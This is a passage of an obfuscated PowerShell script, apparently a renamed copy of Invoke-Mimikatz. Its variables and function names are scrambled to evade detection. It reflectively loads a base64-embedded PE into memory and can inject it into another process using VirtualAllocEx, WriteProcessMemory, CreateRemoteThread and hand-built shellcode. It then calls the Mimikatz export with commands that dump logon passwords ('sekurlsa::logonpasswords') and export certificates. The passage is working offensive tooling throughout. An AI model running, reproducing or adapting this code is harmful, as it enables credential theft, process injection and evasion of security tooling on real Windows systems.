		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$9CEaLCvUTuIPyOk = 0
		foreach ($Info in $xuiExLGxp9EQo9Y)
		{
			$ZdXXNOZDYiFMcpk = $Y9kecWoe9UV9zmX.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$9CEaLCvUTuIPyOk)
			if ($ZdXXNOZDYiFMcpk -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$Y9kecWoe9UV9zmX.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$Y9kecWoe9UV9zmX.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$9CEaLCvUTuIPyOk, [Ref]$9CEaLCvUTuIPyOk) | Out-Null
		}
	}





	Function expanding
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$zmu9SojYFUP9iiK,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$robWSZfqWDtAXZH = levelled
		$Win32Constants = Prince
		$PEInfo = Bournemouth -zmu9SojYFUP9iiK $zmu9SojYFUP9iiK -robWSZfqWDtAXZH $robWSZfqWDtAXZH -Win32Constants $Win32Constants
		

		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$PGCEYcv9jcPyjvp = protestation ($zmu9SojYFUP9iiK) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$tAsOTqIOcRK9MQf = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PGCEYcv9jcPyjvp, [Type]$robWSZfqWDtAXZH.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $tAsOTqIOcRK9MQf.NumberOfNames; $i++)
		{

			$pCaJYQtnosJX9LO = protestation ($zmu9SojYFUP9iiK) ($tAsOTqIOcRK9MQf.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$lllFaYXqsEctCvi = protestation ($zmu9SojYFUP9iiK) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($pCaJYQtnosJX9LO, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($lllFaYXqsEctCvi)

			if ($Name -ceq $FunctionName)
			{


				$sJFCsBOMHmXXsup = protestation ($zmu9SojYFUP9iiK) ($tAsOTqIOcRK9MQf.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$BlB9TZotZdaaUSs = [System.Runtime.InteropServices.Marshal]::PtrToStructure($sJFCsBOMHmXXsup, [Type][UInt16])
				$AgOfnAlXHWEkaBw = protestation ($zmu9SojYFUP9iiK) ($tAsOTqIOcRK9MQf.AddressOfFunctions + ($BlB9TZotZdaaUSs * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$IKc9irbXUtTMmLS = [System.Runtime.InteropServices.Marshal]::PtrToStructure($AgOfnAlXHWEkaBw, [Type][UInt32])
				return protestation ($zmu9SojYFUP9iiK) ($IKc9irbXUtTMmLS)
			}
		}
		
		return [IntPtr]::Zero
	}


	Function wainscotted
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$tJYsDb9BwcjqONx,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$yDmQaeYubI9INki,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$lhZ9id9GVAcGlDC
		)
		
		$tuIbncFQmkbV9im = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		

		$Win32Constants = Prince
		$Y9kecWoe9UV9zmX = zenith
		$robWSZfqWDtAXZH = levelled
		
		$TxKhedHCwUiloY9 = $false
		if (($lhZ9id9GVAcGlDC -ne $null) -and ($lhZ9id9GVAcGlDC -ne [IntPtr]::Zero))
		{
			$TxKhedHCwUiloY9 = $true
		}
		

		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = adulterate -tJYsDb9BwcjqONx $tJYsDb9BwcjqONx -robWSZfqWDtAXZH $robWSZfqWDtAXZH
		$PwppyOHKEvulXg9 = $PEInfo.OriginalImageBase
		$nsaxt9ijPysksKD = $true
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$nsaxt9ijPysksKD = $false
		}
		
		

		$aUozgpZvBQWl9C9 = $true
		if ($TxKhedHCwUiloY9 -eq $true)
		{
			$9leuC99eFUTSynG = $Y9kecWoe9UV9zmX.GetModuleHandle.Invoke("kernel32.dll")
			$gtfwrZEdKIxfWbP = $Y9kecWoe9UV9zmX.GetProcAddress.Invoke($9leuC99eFUTSynG, "IsWow64Process")
			if ($gtfwrZEdKIxfWbP -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$stD9CgNhTuVaGWm = $false
			$ZdXXNOZDYiFMcpk = $Y9kecWoe9UV9zmX.IsWow64Process.Invoke($lhZ9id9GVAcGlDC, [Ref]$stD9CgNhTuVaGWm)
			if ($ZdXXNOZDYiFMcpk -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($stD9CgNhTuVaGWm -eq $true) -or (($stD9CgNhTuVaGWm -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$aUozgpZvBQWl9C9 = $false
			}
			

			$9PCc9mlSccnhWbj = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$9PCc9mlSccnhWbj = $false
			}
			if ($9PCc9mlSccnhWbj -ne $aUozgpZvBQWl9C9)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$aUozgpZvBQWl9C9 = $false
			}
		}
		if ($aUozgpZvBQWl9C9 -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		


		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
		[IntPtr]$hnWZpgBdYjQBioG = [IntPtr]::Zero
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
			[IntPtr]$hnWZpgBdYjQBioG = $PwppyOHKEvulXg9
		}

		$zmu9SojYFUP9iiK = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$fdgoOvs9kUFjSBE = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $zmu9SojYFUP9iiK. If it is loaded in a remote process, this is the address in the remote process.
		if ($TxKhedHCwUiloY9 -eq $true)
		{

			$zmu9SojYFUP9iiK = $Y9kecWoe9UV9zmX.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			

			$fdgoOvs9kUFjSBE = $Y9kecWoe9UV9zmX.VirtualAllocEx.Invoke($lhZ9id9GVAcGlDC, $hnWZpgBdYjQBioG, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($fdgoOvs9kUFjSBE -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($nsaxt9ijPysksKD -eq $true)
			{
				$zmu9SojYFUP9iiK = $Y9kecWoe9UV9zmX.VirtualAlloc.Invoke($hnWZpgBdYjQBioG, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$zmu9SojYFUP9iiK = $Y9kecWoe9UV9zmX.VirtualAlloc.Invoke($hnWZpgBdYjQBioG, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$fdgoOvs9kUFjSBE = $zmu9SojYFUP9iiK
		}
		
		[IntPtr]$9sWMxMManpAHbjO = protestation ($zmu9SojYFUP9iiK) ([Int64]$PEInfo.SizeOfImage)
		if ($zmu9SojYFUP9iiK -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($tJYsDb9BwcjqONx, 0, $zmu9SojYFUP9iiK, $PEInfo.SizeOfHeaders) | Out-Null
		
		

		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = Bournemouth -zmu9SojYFUP9iiK $zmu9SojYFUP9iiK -robWSZfqWDtAXZH $robWSZfqWDtAXZH -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $9sWMxMManpAHbjO
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $fdgoOvs9kUFjSBE
		Write-Verbose "StartAddress: $zmu9SojYFUP9iiK    EndAddress: $9sWMxMManpAHbjO"
		
		

		Write-Verbose "Copy PE sections in to memory"
		pokier -tJYsDb9BwcjqONx $tJYsDb9BwcjqONx -PEInfo $PEInfo -Y9kecWoe9UV9zmX $Y9kecWoe9UV9zmX -robWSZfqWDtAXZH $robWSZfqWDtAXZH
		
		

		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Glaswegian -PEInfo $PEInfo -PwppyOHKEvulXg9 $PwppyOHKEvulXg9 -Win32Constants $Win32Constants -robWSZfqWDtAXZH $robWSZfqWDtAXZH

		

		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($TxKhedHCwUiloY9 -eq $true)
		{
			postbox -PEInfo $PEInfo -Y9kecWoe9UV9zmX $Y9kecWoe9UV9zmX -robWSZfqWDtAXZH $robWSZfqWDtAXZH -Win32Constants $Win32Constants -lhZ9id9GVAcGlDC $lhZ9id9GVAcGlDC
		}
		else
		{
			postbox -PEInfo $PEInfo -Y9kecWoe9UV9zmX $Y9kecWoe9UV9zmX -robWSZfqWDtAXZH $robWSZfqWDtAXZH -Win32Constants $Win32Constants
		}
		
		

		if ($TxKhedHCwUiloY9 -eq $false)
		{
			if ($nsaxt9ijPysksKD -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				compassion -PEInfo $PEInfo -Y9kecWoe9UV9zmX $Y9kecWoe9UV9zmX -Win32Constants $Win32Constants -robWSZfqWDtAXZH $robWSZfqWDtAXZH
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		

		if ($TxKhedHCwUiloY9 -eq $true)
		{
			[UInt32]$VrbbNpbyeL9bLTo = 0
			$ZdXXNOZDYiFMcpk = $Y9kecWoe9UV9zmX.WriteProcessMemory.Invoke($lhZ9id9GVAcGlDC, $fdgoOvs9kUFjSBE, $zmu9SojYFUP9iiK, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$VrbbNpbyeL9bLTo)
			if ($ZdXXNOZDYiFMcpk -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		

		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($TxKhedHCwUiloY9 -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$cNTTTmX9ieWvERw = protestation ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$fn9erhCxBlYzaAk = imitates @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$yhQbMPSnDQlqeVw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($cNTTTmX9ieWvERw, $fn9erhCxBlYzaAk)
				
				$yhQbMPSnDQlqeVw.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$cNTTTmX9ieWvERw = protestation ($fdgoOvs9kUFjSBE) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{

					$iaoEhvutRxAchar = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$Bb9vAcyTHUYUHpa = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$kDESa9kSKGCrOvv = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{

					$iaoEhvutRxAchar = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$Bb9vAcyTHUYUHpa = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$kDESa9kSKGCrOvv = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$dTXQ9EtVRg9fbBo = $iaoEhvutRxAchar.Length + $Bb9vAcyTHUYUHpa.Length + $kDESa9kSKGCrOvv.Length + ($tuIbncFQmkbV9im * 2)
				$TtStdBDOhXDvavu = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($dTXQ9EtVRg9fbBo)
				$mGZewXxxxZtvCau = $TtStdBDOhXDvavu
				
				Wheaties -Bytes $iaoEhvutRxAchar -lEjENVUfYtGCRuC $TtStdBDOhXDvavu
				$TtStdBDOhXDvavu = protestation $TtStdBDOhXDvavu ($iaoEhvutRxAchar.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($fdgoOvs9kUFjSBE, $TtStdBDOhXDvavu, $false)
				$TtStdBDOhXDvavu = protestation $TtStdBDOhXDvavu ($tuIbncFQmkbV9im)
				Wheaties -Bytes $Bb9vAcyTHUYUHpa -lEjENVUfYtGCRuC $TtStdBDOhXDvavu
				$TtStdBDOhXDvavu = protestation $TtStdBDOhXDvavu ($Bb9vAcyTHUYUHpa.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($cNTTTmX9ieWvERw, $TtStdBDOhXDvavu, $false)
				$TtStdBDOhXDvavu = protestation $TtStdBDOhXDvavu ($tuIbncFQmkbV9im)
				Wheaties -Bytes $kDESa9kSKGCrOvv -lEjENVUfYtGCRuC $TtStdBDOhXDvavu
				$TtStdBDOhXDvavu = protestation $TtStdBDOhXDvavu ($kDESa9kSKGCrOvv.Length)
				
				$EVkVHH9TvNOKvDY = $Y9kecWoe9UV9zmX.VirtualAllocEx.Invoke($lhZ9id9GVAcGlDC, [IntPtr]::Zero, [UIntPtr][UInt64]$dTXQ9EtVRg9fbBo, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($EVkVHH9TvNOKvDY -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$ZdXXNOZDYiFMcpk = $Y9kecWoe9UV9zmX.WriteProcessMemory.Invoke($lhZ9id9GVAcGlDC, $EVkVHH9TvNOKvDY, $mGZewXxxxZtvCau, [UIntPtr][UInt64]$dTXQ9EtVRg9fbBo, [Ref]$VrbbNpbyeL9bLTo)
				if (($ZdXXNOZDYiFMcpk -eq $false) -or ([UInt64]$VrbbNpbyeL9bLTo -ne [UInt64]$dTXQ9EtVRg9fbBo))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$AYKjfEMrJMj9fB9 = tented -DrOGwg9DdCngpap $lhZ9id9GVAcGlDC -StartAddress $EVkVHH9TvNOKvDY -Y9kecWoe9UV9zmX $Y9kecWoe9UV9zmX
				$gtfwrZEdKIxfWbP = $Y9kecWoe9UV9zmX.WaitForSingleObject.Invoke($AYKjfEMrJMj9fB9, 20000)
				if ($gtfwrZEdKIxfWbP -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Y9kecWoe9UV9zmX.VirtualFreeEx.Invoke($lhZ9id9GVAcGlDC, $EVkVHH9TvNOKvDY, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{

			[IntPtr]$IoeTHORJTBkOEcx = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($IoeTHORJTBkOEcx, 0, 0x00)
			$CBbDR99QVhAmFAX = murals -PEInfo $PEInfo -Y9kecWoe9UV9zmX $Y9kecWoe9UV9zmX -Win32Constants $Win32Constants -rbrSWFsscZibMtK $yDmQaeYubI9INki -IoeTHORJTBkOEcx $IoeTHORJTBkOEcx



			[IntPtr]$Tq9scBVMWGDBvMv = protestation ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $Tq9scBVMWGDBvMv. Creating thread for the EXE to run in."

			$Y9kecWoe9UV9zmX.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $Tq9scBVMWGDBvMv, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$BdXLArrpHh9HtDt = [System.Runtime.InteropServices.Marshal]::ReadByte($IoeTHORJTBkOEcx, 0)
				if ($BdXLArrpHh9HtDt -eq 1)
				{
					tarmacked -xuiExLGxp9EQo9Y $CBbDR99QVhAmFAX -Y9kecWoe9UV9zmX $Y9kecWoe9UV9zmX -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $fdgoOvs9kUFjSBE)
	}
	
	
	Function validity
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$zmu9SojYFUP9iiK
		)
		

		$Win32Constants = Prince
		$Y9kecWoe9UV9zmX = zenith
		$robWSZfqWDtAXZH = levelled
		
		$PEInfo = Bournemouth -zmu9SojYFUP9iiK $zmu9SojYFUP9iiK -robWSZfqWDtAXZH $robWSZfqWDtAXZH -Win32Constants $Win32Constants
		

		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$Iwqkk9jSfChiKiO = protestation ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$W9HlPE9ITcdOYuU = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Iwqkk9jSfChiKiO, [Type]$robWSZfqWDtAXZH.IMAGE_IMPORT_DESCRIPTOR)
				

				if ($W9HlPE9ITcdOYuU.Characteristics -eq 0 `
						-and $W9HlPE9ITcdOYuU.FirstThunk -eq 0 `
						-and $W9HlPE9ITcdOYuU.ForwarderChain -eq 0 `
						-and $W9HlPE9ITcdOYuU.Name -eq 0 `
						-and $W9HlPE9ITcdOYuU.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$9LB9KgCRTaWHgPg = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((protestation ([Int64]$PEInfo.PEHandle) ([Int64]$W9HlPE9ITcdOYuU.Name)))
				$O9cmFyqrsoKpyrD = $Y9kecWoe9UV9zmX.GetModuleHandle.Invoke($9LB9KgCRTaWHgPg)

				if ($O9cmFyqrsoKpyrD -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $9LB9KgCRTaWHgPg. Continuing anyways" -WarningAction Continue
				}
				
				$ZdXXNOZDYiFMcpk = $Y9kecWoe9UV9zmX.FreeLibrary.Invoke($O9cmFyqrsoKpyrD)
				if ($ZdXXNOZDYiFMcpk -eq $false)
				{
					Write-Warning "Unable to free library: $9LB9KgCRTaWHgPg. Continuing anyways." -WarningAction Continue
				}
				
				$Iwqkk9jSfChiKiO = protestation ($Iwqkk9jSfChiKiO) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$robWSZfqWDtAXZH.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		

		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$cNTTTmX9ieWvERw = protestation ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$fn9erhCxBlYzaAk = imitates @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$yhQbMPSnDQlqeVw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($cNTTTmX9ieWvERw, $fn9erhCxBlYzaAk)
		
		$yhQbMPSnDQlqeVw.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$ZdXXNOZDYiFMcpk = $Y9kecWoe9UV9zmX.VirtualFree.Invoke($zmu9SojYFUP9iiK, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($ZdXXNOZDYiFMcpk -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Y9kecWoe9UV9zmX = zenith
		$robWSZfqWDtAXZH = levelled
		$Win32Constants =  Prince
		
		$lhZ9id9GVAcGlDC = [IntPtr]::Zero
	

		if (($ZAmDbs99R9CgAnI -ne $null) -and ($ZAmDbs99R9CgAnI -ne 0) -and ($TgLQjSaIcQeLnpr -ne $null) -and ($TgLQjSaIcQeLnpr -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($TgLQjSaIcQeLnpr -ne $null -and $TgLQjSaIcQeLnpr -ne "")
		{
			$PoUBMvbQadfpidD = @(Get-Process -Name $TgLQjSaIcQeLnpr -ErrorAction SilentlyContinue)
			if ($PoUBMvbQadfpidD.Count -eq 0)
			{
				Throw "Can't find process $TgLQjSaIcQeLnpr"
			}
			elseif ($PoUBMvbQadfpidD.Count -gt 1)
			{
				$RPLLSHYGFWA9hOB = Get-Process | where { $_.Name -eq $TgLQjSaIcQeLnpr } | Select-Object ProcessName, Id, SessionId
				Write-Output $RPLLSHYGFWA9hOB
				Throw "More than one instance of $TgLQjSaIcQeLnpr found, please specify the process ID to inject in to."
			}
			else
			{
				$ZAmDbs99R9CgAnI = $PoUBMvbQadfpidD[0].ID
			}
		}
		







		
		if (($ZAmDbs99R9CgAnI -ne $null) -and ($ZAmDbs99R9CgAnI -ne 0))
		{
			$lhZ9id9GVAcGlDC = $Y9kecWoe9UV9zmX.OpenProcess.Invoke(0x001F0FFF, $false, $ZAmDbs99R9CgAnI)
			if ($lhZ9id9GVAcGlDC -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ZAmDbs99R9CgAnI"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		


		Write-Verbose "Calling wainscotted"

        try
        {
            $HcWHGRj9NSWiPrb = Get-WmiObject -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }

        if ($HcWHGRj9NSWiPrb -is [array])
        {
            $h9lUsHYODWwhmHV = $HcWHGRj9NSWiPrb[0]
        } else {
            $h9lUsHYODWwhmHV = $HcWHGRj9NSWiPrb
        }

        if ( ( $h9lUsHYODWwhmHV.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {
            Write-Verbose ( "Architecture: " + $h9lUsHYODWwhmHV.AddressWidth + " Process: " + ([System.IntPtr]::Size * 8))
            Write-Error "PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS." -ErrorAction Stop
        }


        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$tJYsDb9BwcjqONx = [Byte[]][Convert]::FromBase64String($fKmtReldlnsntbf)
        }
        else
        {
            [Byte[]]$tJYsDb9BwcjqONx = [Byte[]][Convert]::FromBase64String($SVJAqEBa9vxwmRA)
        }
        $tJYsDb9BwcjqONx[0] = 0
        $tJYsDb9BwcjqONx[1] = 0
		$zmu9SojYFUP9iiK = [IntPtr]::Zero
		if ($lhZ9id9GVAcGlDC -eq [IntPtr]::Zero)
		{
			$jVZpgWKlsTrId9D = wainscotted -tJYsDb9BwcjqONx $tJYsDb9BwcjqONx -yDmQaeYubI9INki $yDmQaeYubI9INki
		}
		else
		{
			$jVZpgWKlsTrId9D = wainscotted -tJYsDb9BwcjqONx $tJYsDb9BwcjqONx -yDmQaeYubI9INki $yDmQaeYubI9INki -lhZ9id9GVAcGlDC $lhZ9id9GVAcGlDC
		}
		if ($jVZpgWKlsTrId9D -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$zmu9SojYFUP9iiK = $jVZpgWKlsTrId9D[0]
		$srxNcit9SsCKJbA = $jVZpgWKlsTrId9D[1] #only matters if you loaded in to a remote process
		
		

		$PEInfo = Bournemouth -zmu9SojYFUP9iiK $zmu9SojYFUP9iiK -robWSZfqWDtAXZH $robWSZfqWDtAXZH -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($lhZ9id9GVAcGlDC -eq [IntPtr]::Zero))
		{



                    Write-Verbose "Calling function with WString return type"
				    [IntPtr]$iOTQuPGUuVETMFo = expanding -zmu9SojYFUP9iiK $zmu9SojYFUP9iiK -FunctionName "powershell_reflective_mimikatz"
				    if ($iOTQuPGUuVETMFo -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $rgk9hqFIzwdocqh = imitates @([IntPtr]) ([IntPtr])
				    $LsUUDPvx9uN9ZcX = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($iOTQuPGUuVETMFo, $rgk9hqFIzwdocqh)
                    $azUhBEU9t99lMtG = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($yDmQaeYubI9INki)
				    [IntPtr]$h9HyREPFuuJlZiN = $LsUUDPvx9uN9ZcX.Invoke($azUhBEU9t99lMtG)
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($azUhBEU9t99lMtG)
				    if ($h9HyREPFuuJlZiN -eq [IntPtr]::Zero)
				    {
				    	Throw "Unable to get output, Output Ptr is NULL"
				    }
				    else
				    {
				        $fAtUkxq9nLzzsci = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($h9HyREPFuuJlZiN)
				        Write-Output $fAtUkxq9nLzzsci
				        $Y9kecWoe9UV9zmX.LocalFree.Invoke($h9HyREPFuuJlZiN);
				    }



		}

		elseif (($PEInfo.FileType -ieq "DLL") -and ($lhZ9id9GVAcGlDC -ne [IntPtr]::Zero))
		{
			$BZgdouVzcviLRJR = expanding -zmu9SojYFUP9iiK $zmu9SojYFUP9iiK -FunctionName "VoidFunc"
			if (($BZgdouVzcviLRJR -eq $null) -or ($BZgdouVzcviLRJR -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$BZgdouVzcviLRJR = conditions $BZgdouVzcviLRJR $zmu9SojYFUP9iiK
			$BZgdouVzcviLRJR = protestation $BZgdouVzcviLRJR $srxNcit9SsCKJbA
			

			$AYKjfEMrJMj9fB9 = tented -DrOGwg9DdCngpap $lhZ9id9GVAcGlDC -StartAddress $BZgdouVzcviLRJR -Y9kecWoe9UV9zmX $Y9kecWoe9UV9zmX
		}
		

		if ($lhZ9id9GVAcGlDC -eq [IntPtr]::Zero)
		{
			validity -zmu9SojYFUP9iiK $zmu9SojYFUP9iiK
		}
		else
		{

			$ZdXXNOZDYiFMcpk = $Y9kecWoe9UV9zmX.VirtualFree.Invoke($zmu9SojYFUP9iiK, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($ZdXXNOZDYiFMcpk -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}

	Main
}


Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$UHcZXDXNZDDbXBU  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	

	if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
	{
		$yDmQaeYubI9INki = "sekurlsa::logonpasswords exit"
	}
    elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
    {
        $yDmQaeYubI9INki = "crypto::cng crypto::capi `"crypto::certificates /export`" `"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" exit"
    }
    else
    {
        $yDmQaeYubI9INki = $Command
    }

    [System.IO.Directory]::SetCurrentDirectory($pwd)



    



